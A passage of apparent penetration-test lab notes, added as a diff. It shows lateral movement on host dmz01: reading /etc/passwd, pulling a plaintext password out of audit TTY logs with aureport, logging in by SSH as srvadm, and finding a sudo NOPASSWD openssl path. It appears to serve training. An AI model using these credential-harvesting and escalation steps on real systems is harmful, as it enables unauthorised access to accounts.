@@ -692,3 +692,158 @@ A login form is presented. No bypass or successful brute force was achieved agai
 
 ## DMZ01 Lateral movement from webdev to srvadm
 
+
+```bash
+webdev@dmz01:/home/webdev$ id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+```
+
+```bash
+webdev@dmz01:/home/webdev$ ls /home
+lab_adm  pixel  srvadm  tom  webdev
+```
+
+```bash
+webdev@dmz01:/home/webdev$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lab_adm:x:1000:1000:lab_adm:/home/lab_adm:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+pixel:x:1001:1001::/home/pixel:/bin/sh
+tom:x:1002:1002::/home/tom:/bin/sh
+srvadm:x:1003:1003::/home/srvadm:/bin/sh
+ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+bind:x:115:121::/var/cache/bind:/usr/sbin/nologin
+dovecot:x:116:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:117:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+postfix:x:118:124::/var/spool/postfix:/usr/sbin/nologin
+webdev:x:1004:1004::/home/webdev:/bin/sh
+_rpc:x:119:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
+webdev@dmz01:/home/webdev$ 
+
+```
+
+```
+webdev@dmz01:/home/webdev$ aureport --tty | less
+Error opening config file (Permission denied)
+NOTE - using built-in logs: /var/log/audit/audit.log
+WARNING: terminal is not fully functional
+-  (press RETURN)
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
+2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
+3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
+4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
+5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
+6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
+7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
+8. 06/01/22 07:13:36 365 1004 ? 4 sh "exit",<nl>
+9. 06/01/22 07:13:50 371 0 ? 2 bash "clear",<ret>,"aureport --ty",<ret>,"clear",
+<ret>,<up>,<up>,<left>,<left>,"t",<ret>,<up>,<ret>,<up>,<ret>,<up>,<ret>,"clear"
+,<ret>,<down>,<down>,<up>,<up>,<ret>
+10. 06/01/22 10:25:00 341 0 ? 2 docker "ls",<ret>,"cd /var/www/html",<ret>,"ls",
+<ret>,"ls -la",<ret>,"apt i",<backspace>,"update &7 apt inst",<backspace>,<backs
+pace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<b
+ackspace>,<backspace>,"& apt install nano",<ret>,"nano in",<tab>,<ret>,<down>,<d
+own>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down
+>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<
+down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<dow
+:
+
+```
+
+ssh access as srvadm:
+
+```
+ssh srvadm@inlanefreight.local             
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+srvadm@inlanefreight.local's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 10 Nov 2026 08:25:43 PM UTC
+
+  System load:                      0.07
+  Usage of /:                       93.7% of 13.72GB
+  Memory usage:                     64%
+  Swap usage:                       0%
+  Processes:                        438
+  Users logged in:                  0
+  IPv4 address for br-65c448355ed2: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.129.229.147
+  IPv6 address for ens160:          dead:beef::250:56ff:fe8a:405f
+  IPv4 address for ens192:          172.16.8.120
+
+  => / is using 93.7% of 13.72GB
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+82 updates can be applied immediately.
+16 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
+$ id
+uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
+$ sudo -l
+Matching Defaults entries for srvadm on dmz01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User srvadm may run the following commands on dmz01:
+    (ALL) NOPASSWD: /usr/bin/openssl
+$ 
+
+```
+
+## Privesc on DMZ01
